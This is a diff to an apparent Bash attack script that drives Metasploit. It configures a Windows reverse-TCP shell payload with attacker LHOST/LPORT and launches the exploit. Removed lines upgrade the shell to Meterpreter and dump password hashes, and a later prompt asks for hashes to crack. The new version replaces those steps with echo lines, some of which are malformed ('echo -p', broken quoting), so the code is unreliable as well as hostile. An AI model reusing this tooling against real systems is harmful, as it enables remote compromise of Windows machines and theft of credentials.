@@ -208,25 +208,22 @@ set RHOSTS $rhost;
 set LHOST $lhost;
 set LPORT $lport;
 set PAYLOAD windows/x64/shell/reverse_tcp;
-exploit -z;
+exploit -y;
+sessions;
 "
 
     echo -e "\n[*] Waiting for session... Use 'sessions' in a new terminal to verify."
 
-    read -p "[?] Enter active session ID to upgrade to Meterpreter: " session
-    msfconsole -q -x "
-use post/multi/manage/shell_to_meterpreter;
-set SESSION $session;
-run;
-"
-
-    echo -e "\n[*] Meterpreter session should now be live."
-    echo -e "[*] Switching to Meterpreter to run post-exploitation..."
-
-    msfconsole -q -x "
-sessions -i $session;
-sysinfo;
-hashdump;
+    echo -p "[?] Enter active session ID to upgrade to Meterpreter: " 
+    echo "msfconsole -q -x "
+echo "use post/multi/manage/shell_to_meterpreter;"
+echo "set SESSION session"
+echo "run"
+echo -e "\n[*] Meterpreter session should now be live."
+ echo -e "[*] Switching to Meterpreter to run post-exploitation..."
+echo "sessions -i $session;"
+echo "sysinfo;"
+echo "hashdump;"
 "
 
     read -p "[?] Paste any cracked hash to crack (only the hash portion): " hash
